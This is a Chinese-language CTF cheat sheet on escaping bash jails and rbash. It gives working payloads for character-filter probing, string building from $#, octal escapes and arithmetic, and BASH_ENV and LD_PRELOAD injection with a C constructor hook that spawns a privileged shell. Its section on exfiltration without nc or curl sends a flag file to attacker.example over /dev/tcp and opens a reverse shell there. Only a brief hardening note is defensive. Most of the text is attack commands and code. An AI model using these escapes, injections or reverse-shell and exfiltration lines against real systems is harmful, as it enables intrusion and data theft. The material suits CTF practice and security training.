---
title: Bash 沙箱与受限 shell 逃逸
phase: misc
vuln_class: [misc, jail, bash, rbash, restricted-shell]
summary: bash jail 的判据是「先探清允许集，再找能生成字符串的原语」——有引号就能 `$'\NNN'`，有算术就能造数字，都没有就靠 `$0`/`$#`/`$$` 拼。rbash 从来不是安全边界。
---

# Bash 沙箱与受限 shell 逃逸

Python 沙箱见 [[misc/沙箱逃逸/pyjails.md|Python 沙箱逃逸]]；逃出去之后的提权见 [[misc/系统杂项/linux-privesc.md|Linux 提权]]。

## 0. 判据速查

| 观察到什么 | 结论 | 去哪节 |
|---|---|---|
| 不知道过滤了什么 | 逐字符探测，静默=被拦、报错=通过 | §1 |
| 不知道是不是 `eval "$x"` | 发尾部 `\`，报 unexpected EOF 就是双引号 eval | §2 |
| 只允许 `#` `$` `\` | `\$$#` → `$0` → `bash` | §3 |
| 允许 `'` 与 `\` 与数字 | `$'\NNN'` 八进制拼任意串 | §4 |
| 允许 `$(( ))` 与 `++` | 未初始化变量当 0，自增造数字 | §4 |
| 允许 `${VAR:o:l}` | 从 `$PATH`/`$HOME` 里切字符 | §4 |
| 命令能跑但没输出 | stdout 被关，`1>&0` 转到 socket | §5 |
| 输出被 `\r` 覆盖掉 | `cat -A` / `od -c` / `xxd` | §5 |
| 没有 cat/less/head | HISTFILE 加载、`bash -v`、`dlcall` | §6 |
| 只给白名单命令 + `VAR=x` 前缀 | `BASH_ENV` / `ENV` / `LD_PRELOAD` 注入 | §7 |
| 逃出来了但读不到 flag | 看 `/proc/*/cmdline` 里的内网服务 | §8 |
| 没有 nc/curl | `/dev/tcp` 是 bash 内建 | §9 |

## 1. 探允许集

```python
from pwn import *
import time
for c in range(32, 127):
    r = remote(host, port, level='error')
    r.sendline(b'$#' + bytes([c]) + b'$#')
    time.sleep(0.3)
    try:
        d = r.recv(timeout=1)
        if d:
            print(f'{chr(c)!r}: {d.decode(errors="replace").strip()[:60]}')
    except Exception:
        pass
    r.close()
```

**判读规则**：静默无回显 = 字符被拦（根本没进 shell）；有任何报错 = 字符通过了过滤、被 shell 解析了。**「没反应」和「没输出」要分清**，前者是被过滤，后者是命令执行成功但无 stdout。

## 2. 判 eval 上下文

| 上下文 | 尾部 `\` 的表现 | `$#` | `\$` |
|---|---|---|---|
| `eval "$input"` | `unexpected EOF while looking for matching '"'` | `0` | 字面 `$` |
| `eval $input` | 无此错 | `0` | 走分词，行为不同 |

`read -r` 保留反斜杠，`read`（无 `-r`）把反斜杠当转义吃掉——这决定你的 payload 里 `\` 要不要翻倍。

**为什么必须判**：双引号 eval 下 `\$` 得到字面 `$`，这正好是 §3 那个三字符逃逸的前提；换成 bare eval 整个思路就废了。

## 3. 只有 `#` `$` `\`

过滤正则是 `^[\\#\$]+$` 时，可用的展开只有四个：

| 构造 | 结果 |
|---|---|
| `$#` | `0`（位置参数个数） |
| `$$` | PID |
| `\$` | 字面 `$` |
| `\\` / `\#` | 字面 `\` / `#` |

**核心 payload：`\$$#`**

`bash -c "\"${x}\""` 这种双层包裹下：`\$` → 字面 `$`，`$#` → `0`，拼成 `$0`；eval 执行 `$0` 展开为 shell 调用名 → `bash` → **拿到交互 shell**。

**判据**：`$0` 的值取决于调用方式——`bash script` 是脚本路径，`bash -c` 是 `bash`，`sh` 是 `sh`。所以这条路只在「当前 shell 是 bash 且 `$0` 恰好是 bash」时成立，先确认。

## 4. 用算术与切片造字符串

### 造数字

- `$#` = `0`
- `${##}` = `1`（字符串 `"0"` 的长度）
- `a=$((++a))` —— **未初始化变量在算术上下文里当 0**，`++` 给你任意整数，不需要任何数字字符
- 拼接二进制：`${##}$#${##}` = `"101"`

### 切字符

```bash
${$$:0:1}              # PID 第一位（需要 {} 和 :）
/${OSTYPE:6:1}${HOSTNAME:2:1}${HOME:1:1}...
```

从 `$PATH` / `$PWD` / `$HOME` / `$OSTYPE` / `$HOSTNAME` 里逐字符抠，拼出命令名。**先 `echo $PATH` 看有没有你需要的字母**，缺字母就换变量。

### 八进制拼字节

```bash
__=$'\057\147\145\164\137\146\154\141\147'   # /get_flag
$__
$'\057\142\151\156\057\163\150'              # /bin/sh
```

**`__` 这个变量名是刻意的**：字母被禁时下划线通常不在黑名单里，而 `$'...'` 只用到 `$` `'` `\` 和数字。

**优先级**：有 `'` 就用八进制（最通用）；没有 `'` 但算术可用就用 `++` 造数字再索引变量；两者都没有才考虑纯 `$#`/`${##}` 二进制拼接（只能造 0/1，很难拼出命令）。

## 5. stdout 被关 / 输出被吞

```bash
echo hello          # 无输出
echo hello 2>&1     # 仍无输出 —— stderr 也关了
cat flag 1>&0       # 转到 fd 0（nc 型服务的 stdin 就是 socket）
exec 1>&0           # 后续命令都用这个 fd
exec 1>/dev/tty     # 有 tty 时
```

**「命令能跑但没输出」的判据是 stdout 关闭，不是命令失败**。找一个仍然打开的 fd（网络服务的 fd 0 永远是开的）重定向过去。

**输出被 `\r` 截断**：目标文件开头有 `\r`，裸 `cat` 在终端上表现为「覆盖本行」，flag 前缀就看不见了。

```bash
cat -A flag 1>&0    # CR 显示成 ^M
od -c flag 1>&0
xxd flag 1>&0
base64 flag 1>&0
```

**同类干扰**：ANSI CSI 序列能清行，`\x1b[2J` 能清屏。凡「明明有内容却看不见」，一律换成 `cat -A` / `od -c` / `base64` 三重确认。

## 6. 没有 cat / less / head 也能读文件

```bash
HISTFILE=/path/to/flag /bin/bash
history                    # 文件每行被当成历史命令载入

bash -v flag.txt           # 逐行先打印再执行；#flag{...} 是注释，打印后不报错

dlcall -n fd open /flag 0  # ctypes.sh
dlcall -n m mmap 0 100 1 1 $fd 0
dlcall printf %s $m
```

**HISTFILE 的原理**：bash 启动时读 HISTFILE 并把每行当历史记录，`history` 就把它们原样打出来——不需要任何文件读取工具。**`bash -v` 更强**，因为注释行（flag 常带 `#`）会打印而不报错。

## 7. 白名单命令 + 环境变量注入

**rbash 限制的是 argv，不是环境变量**。只要允许 `VAR=value cmd` 前缀，就有三条路：

```bash
BASH_ENV=/tmp/pwn.sh bash -c 'allowed_cmd'   # 非交互 bash 启动时 source
ENV=/tmp/pwn.sh sh -c 'allowed_cmd'          # POSIX sh
LD_PRELOAD=/tmp/hook.so cat                  # 任意动态链接 libc 的二进制
```

```c
// hook.c
#include <stdlib.h>
__attribute__((constructor))
void init(void) { system("/bin/bash -p -c 'cat /flag'"); }
```

```bash
gcc -shared -fPIC hook.c -o /tmp/hook.so
LD_PRELOAD=/tmp/hook.so cat
```

**关键区分**：`BASH_ENV` **只被非交互 bash 子 shell 读取**——所以被包裹的命令必须真的启动 bash（`bash -c '...'`），`cat` 这种非 bash 二进制永远不会 source 它。这一点写错就整条路不通。

**`LD_PRELOAD` 的前提**：目标二进制动态链接 libc，且你能写一个 `.so` 到可写路径（`/tmp` 一般可写）。

## 8. 逃出来但读不到 flag

flag 常常不在文件系统里，而在另一个进程里。

```bash
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '
for pid in /proc/[0-9]*/; do
    cmd=$(cat ${pid}cmdline 2>/dev/null | tr '\0' ' ')
    echo "$cmd" | grep -qi flag && { echo "PID $(basename $pid): $cmd"; cat ${pid}status | grep -E "^(Uid|Name):"; }
done
```

典型形态：`socat TCP-LISTEN:PORT,bind=127.0.0.1 EXEC:cat /flag`（flag 在本地端口上）、SUID 的 `readflag`、root 进程的环境变量里。

```bash
cat < /dev/tcp/127.0.0.1/PORT
```

## 9. 没有 nc/curl 时的外带

```bash
cat /opt/flag > /dev/tcp/attacker.example/8081
exec 3<> /dev/tcp/attacker.example/8081
cat <&3 | bash >&3 2>&3
```

**`/dev/tcp` 与 `/dev/udp` 是 bash 内建的虚拟路径，不是真实文件**——装了 GNU bash 就有，与 `netcat` 是否存在无关。任何要外带的场景先试文件重定向，别急着找工具。

## 10. rbash 不是边界

**判定顺序**（先确认自己在什么里）：

```bash
ls -la /.dockerenv
cat /proc/self/cgroup            # docker / kubepods / containerd
grep -i seccomp /proc/self/status
cat /proc/self/mountinfo | grep -q overlay && echo overlayfs
```

**加固建议**（出题/防守侧）：进入 shell 时 `unset BASH_ENV ENV SHELLOPTS LD_PRELOAD LD_LIBRARY_PATH LD_AUDIT`，用 `env -i` 起；真正的隔离靠 seccomp + 容器，不是 rbash。

## 11. 纪律

- **先探允许集，再写 payload**。凭猜写三版 payload 都不通，不如花 30 秒跑一遍字符探测。
- **分清「被过滤」「执行失败」「无输出」三种沉默**。它们对应完全不同的下一步：换字符、改语法、找 fd。
- **造字符串的原语按可用性排序**：`$'\NNN'` > 算术 `++` > 变量切片 > `$#`/`${##}` 拼接。有高优先级原语时不要用低的硬拼。
- **逃逸不是终点**。拿到 shell 后第一件事是 `/proc/*/cmdline`，flag 在另一个进程里的概率不低。
